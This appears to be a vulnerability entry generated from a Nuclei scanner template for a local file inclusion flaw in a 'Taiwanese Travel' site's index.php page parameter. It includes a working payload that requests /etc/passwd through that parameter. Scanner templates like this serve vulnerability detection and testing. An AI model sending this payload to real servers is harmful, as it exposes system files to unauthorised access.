# Nuclei Template: Taiwanese Travel - Local File Inclusion
**Template ID:** taiwanese-travel-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`taiwanese-travel-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The vulnerability in '/index.php?page=' allows for Local File Inclusion (LFI), granting attackers the ability to include and potentially execute files on the server, compromising the application's security

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?page=/etc/passwd
```

## References
- https://www.exploitalert.com/view-details.html?id=35607
